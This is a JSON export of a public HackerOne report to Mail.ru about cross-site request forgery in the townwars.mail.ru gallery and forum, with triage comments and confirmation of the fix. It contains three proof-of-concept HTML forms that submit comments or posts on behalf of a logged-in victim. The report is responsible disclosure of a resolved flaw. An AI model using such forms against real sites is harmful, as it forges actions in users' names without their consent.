{"id":148156,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDgxNTY=","url":"https://hackerone.com/reports/148156","title":"Cross Site Request Forgery (CSRF)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-06-29T07:11:48.282Z","submitted_at":"2016-06-29T07:11:48.282Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"malcolmx","url":"/malcolmx","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":65,"url":"https://hackerone.com/mailru","handle":"mailru","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Mail.ru","twitter_handle":"mailru","website":"https://corp.mail.ru","about":"Building the Internet since 1998"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-07-20T16:10:10.119Z","bug_reporter_agreed_on_going_public_at":"2016-07-07T20:11:23.075Z","team_member_agreed_on_going_public_at":"2016-07-20T16:10:09.999Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n\nI've Found __CSRF__ in ``` townwars.mail.ru/Gallery/addComment/ ```\n\nwhile any user can add image to ``` townwars.mail.ru/Gallery/ ```\nafter that any user can add comment to this image and here there is no any protection \n\n_steps to reproduce_\n- Go to ```   townwars.mail.ru/Gallery/ ```\n- choose any photo \n- you can add a comment on a photo you choosed  \n- now send this form to any user and he will put a comment \n\n __example form__\n``` \u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://townwars.mail.ru/Gallery/addComment/?\u0026pid=39277\u0026gid=515\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"body\" value=\"test\" /\u003e\n      \u003cinput type=\"hidden\" name=\"x\" value=\"68\" /\u003e\n      \u003cinput type=\"hidden\" name=\"y\" value=\"13\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n ```\n\nif you send this form to any login user he will put a comment on the photo in URL\n\n\n__Please Check The POC Video I Attached For More Details \n\n\nThanks\n\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":102417,"file_name":"POC_(CSRF).mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/102/417/02b798459923a50208a946475a61490776d3ea91/POC_%28CSRF%29.mp4?response-content-disposition=attachment%3B%20filename%3D%22POC_%2528CSRF%2529.mp4%22%3B%20filename%2A%3DUTF-8%27%27POC_%2528CSRF%2529.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3XETQKVM%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134338Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCGITGEBL0GDazIgFIa28tiYmEhXENYyhaNz5SA%2FlGoWgIgUpM2O%2BqLplk1PxLgHvwucUcfaWBDs4lcpMfbeWt8lf0qgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDKzBywxhiDPCGniAXCrXA0hN3FmE2a%2FvX745J3E%2FVZOyco%2FXdDJhTa6QLBz8ruxItJd7RBy%2BDgWvdA9F9VhH6hQi1%2BoGROPLiNtVXscv2SAyqwnGAvovNwUJ1XHdXq9csPneVktpMYUl5e6BGW1xCryz1JW0SV%2BUfaSbieJMT38q3eYU9Qxk5dVB%2FFSLDg1wEknhr%2FrXVV%2FyMqUg1dTUYtXEjLNILLRPWX%2F4wv3E6jg3evrZ7gOO5fAJ9yd3K5iXRj4PV28TPJwb4Bp0K3AV23Xw17YRvstL2wS%2FKJ5kkbPQixYXwVbw8yOEBuTf5C9xK0ZT%2BUy2XrR%2BHohMKCcUEmtk4PUYdUQFeneehIWQAkbd4qIQq1wWh3%2BtFZuz9DX0pjS8WWix5bToWfIKFuKulPfC5YwvJmaPyfSRVTaZ6I14bWPkalqD2SgW4Vy%2B09y41yRaXPxOlIrJMFvQS2IEJ1HEHz4ZUR1yXSp0gHeUDD8o18FKUmWJbFX0f4qg6QMujUtz72wUwuuVALx3RPw6LWvm7guP0GVvaCkepTd9y%2FQPIJ5BMWpXjOzk8woMpmPNPVmiY%2B0aJf85ceJPSOr4SQhScx2VlsmYJMnP01anhvN0NHIzV5cw9ydQaVt5O0LNrdQYH%2FIyrzC885CLBjqlAaE%2FfvTfYEPLtbspKR1t8pqzvolC92qkeVrvH%2BpD5KXCuP33P%2Bp2tmR3wVnz2EohJYzmGrrnBvRXs0coN12U37MszdI%2Bvzj6PkJc0Y4l0wDgwvf1eWilxQANi8xmwPgCDVfgGtOQp6uxiNpwW3IAibhcqSDm28IB01CUcpdI9PzabCC%2B8IpU1mKKntGaQJtzs4L%2BAHeAe57KgaMrEoYitz0ixKUbTw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=33ad915f288526ee8b980d2de9c5e82f4c35515ff6f130fecb8ea04939983475","file_size":2752463,"type":"video/mp4"}],"allow_singular_disclosure_at":"2016-08-06T20:11:23.206Z","allow_singular_disclosure_after":-163445535.3352372,"singular_disclosure_allowed":true,"vote_count":9,"voters":["muhammad_uwais","eveeez","khizer47","khaledibnalwalid","anasroubi","secdoor","spetr0x","mahmoud_osama","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1044825,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for reporting your bug to Mail.Ru Group!   We appreciate your time for helping us to make our web services safer.\nWe are currently reviewing your submission and will be back in touch soon.\nUnfortunately,  your report is not in a bug bounty program's scope (check the [rules](https://hackerone.com/mailru)), so  we cannot qualify you for monetary reward. We say \"thank you\" for your help and contribution.","automated_response":false,"created_at":"2016-06-29T08:48:58.434Z","updated_at":"2016-06-29T08:48:58.434Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1044826,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","automated_response":false,"created_at":"2016-06-29T08:49:06.622Z","updated_at":"2016-06-29T08:49:06.622Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Mail.ru"}},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1044883,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@3apa3a \nthank you for your quick replay i want to say tow things \n- the first thing that the the same issue worked in tow other places \n1. when you add new post look to this form here \n```\n\u003chtml\u003e \n  \u003cbody\u003e\n    \u003cform action=\"https://townwars.mail.ru/WWWForum/addPost/?fid=1\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"title\" value=\"test\" /\u003e\n      \u003cinput type=\"hidden\" name=\"body\" value=\"test\" /\u003e\n      \u003cinput type=\"hidden\" name=\"x\" value=\"78\" /\u003e\n      \u003cinput type=\"hidden\" name=\"y\" value=\"15\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\n2. when you want to comment(add message ) to any post too the form  \n```\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://townwars.mail.ru/WWWForum/message_add/?lfrom=0\u0026fid=1\u0026rid=14142\u0026lfrom=0\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"body\" value=\"test\" /\u003e\n      \u003cinput type=\"hidden\" name=\"x\" value=\"73\" /\u003e\n      \u003cinput type=\"hidden\" name=\"y\" value=\"11\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\n__but note that you should be in the Level 10 or more to do that__\nyou will see a message saying to you that you should in level 10 to do that\n\n__i deiced to report all on one report __ \n\nthe second thing i want to say is that report here #141329\nyou see the same sub-domain and you paid a bounty for it \nso why not here?\n\nThanks  ","automated_response":false,"created_at":"2016-06-29T09:52:07.772Z","updated_at":"2016-06-29T09:52:07.772Z","actor":{"username":"malcolmx","cleared":false,"url":"/malcolmx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1044986,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sometimes we do monetary rewards for critical server side  issues (SQLi and another serverside injections, code executions, etc) outside specified scope. #141329 was an example.","automated_response":false,"created_at":"2016-06-29T11:16:26.858Z","updated_at":"2016-06-29T11:16:26.858Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1055461,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Your bug has been fixed! \nPlease confirm that you are no longer able to reproduce the issue. ","automated_response":false,"created_at":"2016-07-06T11:41:28.342Z","updated_at":"2016-07-06T11:41:28.342Z","actor":{"username":"pikachu_mail","cleared":false,"url":"/pikachu_mail","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/071/312/5f78cd40030684b8cf2cce44b1c52e5a79b04aad_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"malcolmx","url":"/malcolmx"},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1056138,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@pikachu_mail \nyes it fixed now it protected by CSRF Token now \n\nThanks ","automated_response":false,"created_at":"2016-07-06T18:38:39.389Z","updated_at":"2016-07-06T18:38:39.389Z","actor":{"username":"malcolmx","cleared":false,"url":"/malcolmx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1058060,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"if you don't mind ","automated_response":false,"created_at":"2016-07-07T20:11:23.105Z","updated_at":"2016-07-07T20:11:23.105Z","first_to_agree":true,"actor":{"username":"malcolmx","cleared":false,"url":"/malcolmx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1078284,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-07-20T16:10:10.046Z","updated_at":"2016-07-20T16:10:10.046Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1078285,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-07-20T16:10:10.148Z","updated_at":"2016-07-20T16:10:10.148Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":2247,"category":"team","content":"CSRF in photo gallery comments on out-of-scope project","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":4836,"username":"3apa3a","name":"Vladimir Dubrovin","bio":"En la agostada senda he visto al buen lagarto (gota de cocodrilo) meditando. ","cleared":false,"website":"https://3proxy.org/","location":"Nizhny Novgorod, Russia","created_at":"2014-04-10T22:08:47.745Z","url":"https://hackerone.com/3apa3a","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"company","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}